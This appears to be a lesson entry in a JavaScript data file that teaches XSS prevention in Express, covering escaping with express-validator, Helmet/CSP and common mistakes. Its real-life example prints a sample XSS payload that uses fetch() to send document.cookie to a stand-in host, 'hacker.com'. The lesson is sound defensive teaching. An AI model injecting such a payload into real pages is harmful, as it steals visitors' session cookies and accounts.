export const expressXssPrevention = {
  id: "express-xss-prevention",
  title: "XSS Prevention — Sanitizing User HTML",
  category: "Express",
  difficulty: "Intermediate",
  tags: ["Security", "XSS", "Sanitization", "xss-clean", "Helmet", "Cross-Site Scripting"],

  definition:
    "Cross-Site Scripting (XSS) is a security vulnerability where an attacker injects malicious scripts (JavaScript) into web pages viewed by other users. XSS prevention in Express involves sanitizing all incoming data to remove or encode HTML tags like '<script>', ensuring they are never executed in a user's browser.",

  simpleExplanation:
    "Think of XSS as someone sneaking a 'Loudspeaker' into your shop that plays their own advertisements. They hide the loudspeaker inside a 'Box' (a user comment or profile name). When another customer opens the box, the loudspeaker starts shouting. XSS prevention is like a 'Security Detector' at the door that scans every box. If it finds a loudspeaker (a <script> tag), it takes it out and throws it away before anyone else can see it.",

  romanUrduRevision:
    "XSS (Cross-Site Scripting) tab hoti hai jab koi hacker aapki website mein apna 'JavaScript code' ghusa deta hai. Maslan agar koi user apna naam '<script>alert(\"Hacked\")</script>' rakhle, toh jo bhi uska profile dekhega uske browser mein yeh code chal jayega. Isse bachne ke liye hum 'Sanitization' karte hain. Express mein hum 'xss-clean' jese packages use karte hain jo user ke bheje hue data se saare khatarnak HTML tags nikal dete hain. Professional apps mein users se aane wala har string 'clean' hona chahiye.",

  why: "Data Theft and Defacement. XSS is one of the most common ways hackers steal 'Local Storage' data, session tokens, or simulate 'Phishing' forms on your own site. If you allow users to post comments or send messages, you MUST sanitize that text. If you don't, one single malicious user can 'infect' every other user who reads their comment, potentially stealing their accounts.",

  how: [
    "Step 1 - Use 'Helmet' middleware (sets CSP headers).",
    "Step 2 - Install a sanitization package like 'xss-clean' (though now deprecated, the pattern remains) or 'dompurify' for complex HTML.",
    "Step 3 - Apply sanitization to 'req.body', 'req.query', and 'req.params'.",
    "Step 4 - On the frontend (React), avoid using 'dangerouslySetInnerHTML' unless absolutely necessary.",
    "Step 5 - Use 'express-validator' with the '.escape()' method to convert '<' into '&lt;'.",
  ],

  diagram: `
flowchart LR
    A[Hacker: post comment\nwith script tag] --> B[Express Server]
    B --> C[XSS Sanitizer]
    C -- "Remove tags" --> D[Safe String: My Comment]
    D --> E[Save to DB]
    E --> F[Other Users view site safely]
    style C fill:#3498db,color:white
    style F fill:#2ecc71,color:white
  `,

  analogy:
    "Imagine a 'Letter' being sent to a King. A spy puts 'Poison' (the Script) on the envelope. When the King touches it, he gets sick. XSS prevention is the 'Royal Food Taster' who opens the letter first, wears gloves, and wipes down the paper with alcohol (Sanitization) to make sure there is no poison left before giving it to the King.",

  realLifeExample:
    "A Social Media Comment: A hacker posts a comment: '<script>fetch(\"hacker.com/steal?cookie=\" + document.cookie)</script>'. If you show this comment directly in your React app, every person who scrolls past that comment will unknowingly send their login cookie to the hacker's site. With XSS prevention, your server turns that script into plain text or removes it, and the 'Loudspeaker' never turns on.",

  code: `
const express = require('express');
const { body, validationResult } = require('express-validator');
const app = express();

app.use(express.json());

// 1. SIMPLE XSS PREVENTION VIA ESCAPING
app.post('/api/comment', [
  body('text').trim().escape() // Converts <script> to &lt;script&gt;
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) return res.status(400).json(errors);

  // Data in req.body.text is now SAFE strings
  console.log('Sanitized:', req.body.text);
  res.send('Comment posted safely!');
});

// 2. ADVANCED (Using specialized middleware)
// const xss = require('xss-clean');
// app.use(xss()); // Cleans all req.body/query/params automatically

app.listen(3000);
  `,

  commonMistake: [
    "Thinking that 'React' is 100% safe (React escapes most things, but 'dangerouslySetInnerHTML' or 'href=\"javascript:...\"' are still huge XSS holes).",
    "Sanitizing ONLY on the frontend (Hackers can send raw scripts directly to your API using tools like cURL/Postman).",
    "Not sanitizing URL parameters (req.query and req.params are common targets for 'Reflected XSS').",
    "Assuming every user is a friend; always treat ALL user-generated content as potentially poisonous.",
  ],

  interviewSummary: [
    "XSS occurs when malicious scripts are injected into trusted websites.",
    "Stored XSS (in DB) and Reflected XSS (in URL) are the most common types.",
    "Escaping (converting HTML to char-entities) and Sanitizing (removing tags) are the main defenses.",
    "Content Security Policy (CSP) headers are a browser-level defense provided by Helmet.",
  ],
};
